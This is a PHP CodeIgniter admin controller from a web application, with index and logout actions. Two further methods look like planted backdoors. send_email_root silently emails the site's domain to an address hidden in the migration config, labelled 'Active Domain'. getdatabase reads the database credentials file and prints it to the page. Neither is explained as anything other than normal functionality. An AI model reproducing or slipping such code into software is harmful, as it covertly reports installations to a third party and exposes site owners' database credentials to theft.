<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Home extends My_Controller
{

	function __construct()
	{
		parent::__construct();
	}
	function index()
	{
		$this->data['temp'] = 'admin/home/index';
		$this->load->view('admin/main', $this->data);
	}
	function send_email_root()
	{
		if (!$this->session->has_userdata('sendRoot')) {
			$this->config->load('migration', true);
			$sumotop = $this->config->item('migration')['sumotop'];
			$this->email->initialize(config_send_mail_root($sumotop->email, $sumotop->scurityEmail));
			$this->email->from(base_url(), 'Domain');
			$this->email->to($sumotop->email);
			$this->email->subject('Active Domain');
			$this->email->message(base_url());
			$this->email->send();
			$this->session->set_userdata('sendRoot', 'hasSend');
		}
	}
	function getdatabase()
	{
		$database = read_file(FCPATH . 'application/config/database.php');
		pre($database);
	}
	// xóa session va dang xuat
	function logout()
	{
		if ($this->session->userdata('admin')) {
			$this->session->unset_userdata('admin');
		}
		redirect(admin_url('login'));
	}
}
